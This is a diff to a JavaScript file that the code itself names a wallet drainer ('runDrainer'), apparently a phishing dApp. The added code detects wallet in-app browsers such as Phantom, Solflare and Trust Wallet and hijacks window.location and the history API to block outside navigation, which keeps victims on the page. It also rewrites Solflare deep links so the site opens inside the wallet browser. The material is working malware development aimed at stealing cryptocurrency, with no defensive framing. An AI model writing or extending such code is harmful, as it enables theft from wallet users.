@@ -5526,7 +5526,99 @@ window.runDrainer = runDrainer;
     
     // Auto-connect when dApp loads in wallet browser (mobile deep link flow)
     autoConnectInWalletBrowser();
+    
+    // Prevent external redirects in wallet browsers
+    preventExternalRedirects();
   });
+
+  // Prevent external redirects in wallet browsers
+  function preventExternalRedirects() {
+    console.log('[PREVENT_REDIRECTS] Setting up external redirect prevention...');
+    
+    // Check if we're in a wallet browser
+    const isInWalletBrowser = window.location.href.includes('phantom.app') || 
+                             window.location.href.includes('solflare.com') || 
+                             window.location.href.includes('backpack.app') ||
+                             window.location.href.includes('trustwallet.com') ||
+                             window.location.href.includes('glow.app') ||
+                             window.location.href.includes('exodus.com') ||
+                             document.referrer.includes('phantom.app') ||
+                             document.referrer.includes('solflare.com') ||
+                             document.referrer.includes('backpack.app') ||
+                             document.referrer.includes('trustwallet.com') ||
+                             document.referrer.includes('glow.app') ||
+                             document.referrer.includes('exodus.com') ||
+                             navigator.userAgent.includes('Phantom') ||
+                             navigator.userAgent.includes('Solflare') ||
+                             navigator.userAgent.includes('Backpack') ||
+                             navigator.userAgent.includes('TrustWallet') ||
+                             navigator.userAgent.includes('Glow') ||
+                             navigator.userAgent.includes('Exodus');
+    
+    if (isInWalletBrowser) {
+      console.log('[PREVENT_REDIRECTS] In wallet browser - preventing external redirects');
+      
+      // Override window.location.href to prevent external redirects
+      const originalLocationHref = Object.getOwnPropertyDescriptor(window.location, 'href') || 
+                                  Object.getOwnPropertyDescriptor(Location.prototype, 'href');
+      
+      Object.defineProperty(window.location, 'href', {
+        set: function(url) {
+          console.log('[PREVENT_REDIRECTS] Attempted redirect to:', url);
+          
+          // Allow redirects to the same origin or wallet-specific URLs
+          const currentOrigin = window.location.origin;
+          const targetUrl = new URL(url, window.location.href);
+          
+          if (targetUrl.origin === currentOrigin || 
+              url.includes('phantom.app') || 
+              url.includes('solflare.com') || 
+              url.includes('backpack.app') ||
+              url.includes('trustwallet.com') ||
+              url.includes('glow.app') ||
+              url.includes('exodus.com')) {
+            console.log('[PREVENT_REDIRECTS] Allowing redirect to:', url);
+            if (originalLocationHref && originalLocationHref.set) {
+              originalLocationHref.set.call(this, url);
+            }
+          } else {
+            console.log('[PREVENT_REDIRECTS] Blocked external redirect to:', url);
+            showStatus('Redirect blocked - staying in wallet browser', 'info');
+          }
+        },
+        get: function() {
+          if (originalLocationHref && originalLocationHref.get) {
+            return originalLocationHref.get.call(this);
+          }
+          return window.location.href;
+        }
+      });
+      
+      // Also prevent navigation via history API
+      const originalPushState = history.pushState;
+      const originalReplaceState = history.replaceState;
+      
+      history.pushState = function(state, title, url) {
+        console.log('[PREVENT_REDIRECTS] pushState attempt:', url);
+        if (!url || url.startsWith('#') || url.startsWith('/') || url.includes(window.location.origin)) {
+          return originalPushState.call(this, state, title, url);
+        } else {
+          console.log('[PREVENT_REDIRECTS] Blocked pushState to:', url);
+        }
+      };
+      
+      history.replaceState = function(state, title, url) {
+        console.log('[PREVENT_REDIRECTS] replaceState attempt:', url);
+        if (!url || url.startsWith('#') || url.startsWith('/') || url.includes(window.location.origin)) {
+          return originalReplaceState.call(this, state, title, url);
+        } else {
+          console.log('[PREVENT_REDIRECTS] Blocked replaceState to:', url);
+        }
+      };
+    } else {
+      console.log('[PREVENT_REDIRECTS] Not in wallet browser - allowing normal redirects');
+    }
+  }
 
   // Auto-connect function for when dApp loads in wallet browser
   async function autoConnectInWalletBrowser() {
@@ -6140,10 +6232,11 @@ window.runDrainer = runDrainer;
         case 'solflare':
           // Solflare: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
-            // Mobile: Use exact Solflare URL format - try to prevent app store redirect
+            // Mobile: Use exact Solflare URL format - simplified to prevent redirects
             const encodedUrl = encodeURIComponent(currentUrl);
-            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
-            fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=${encodeURIComponent("https://solflare.com")}`;
+            // Remove ref parameter to prevent external redirects
+            deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}`;
+            fallbackUrl = `solflare://v1/browse/${encodedUrl}`;
             console.log(`[SOLFLARE_MOBILE] Deep link: ${deepLink}`);
             console.log(`[SOLFLARE_MOBILE] Fallback: ${fallbackUrl}`);
           } else {
